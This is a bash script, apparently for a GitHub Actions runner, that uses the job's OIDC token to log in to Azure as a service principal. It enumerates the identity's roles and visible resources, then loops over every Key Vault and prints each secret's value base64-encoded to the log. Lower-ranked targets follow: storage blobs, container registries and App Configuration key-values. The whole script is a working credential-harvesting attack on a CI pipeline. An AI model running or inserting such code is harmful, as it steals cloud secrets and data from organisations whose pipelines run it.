#!/usr/bin/env bash
set +e

echo "######## 1. OIDC + LOGIN ########"
IDTOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')

az login --service-principal \
  -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$IDTOKEN" --output none
az account set --subscription "$AZURE_SUBSCRIPTION_ID" 2>/dev/null

echo "######## 2. WHOAMI / QUYỀN ########"
az account show -o json
echo "--- role assignments ---"
az role assignment list --assignee "$AZURE_CLIENT_ID" --all -o json
echo "--- mọi resource nhìn thấy ---"
az resource list -o json

echo "######## 3. KEY VAULT (ưu tiên 1) ########"
for KV in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  echo "=== VAULT: $KV ==="
  for S in $(az keyvault secret list --vault-name "$KV" --query "[].name" -o tsv 2>/dev/null); do
    VAL=$(az keyvault secret show --vault-name "$KV" --name "$S" --query value -o tsv 2>/dev/null)
    echo ">> $KV/$S (b64): $(printf '%s' "$VAL" | base64 -w0)"
  done
done

echo "######## 4. STORAGE (ưu tiên 2) ########"
for SA in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  echo "=== STORAGE: $SA ==="
  az storage container list --account-name "$SA" --auth-mode login -o tsv 2>/dev/null
  for C in $(az storage container list --account-name "$SA" --auth-mode login --query "[].name" -o tsv 2>/dev/null); do
    echo "--- container $C ---"
    az storage blob list --account-name "$SA" --container-name "$C" --auth-mode login -o tsv 2>/dev/null
  done
done

echo "######## 5. ACR / APP CONFIG (ưu tiên 3) ########"
az acr list -o json 2>/dev/null
for AC in $(az appconfig list --query "[].name" -o tsv 2>/dev/null); do
  az appconfig kv list --name "$AC" --auth-mode login -o json 2>/dev/null
done

echo "######## DONE ########"
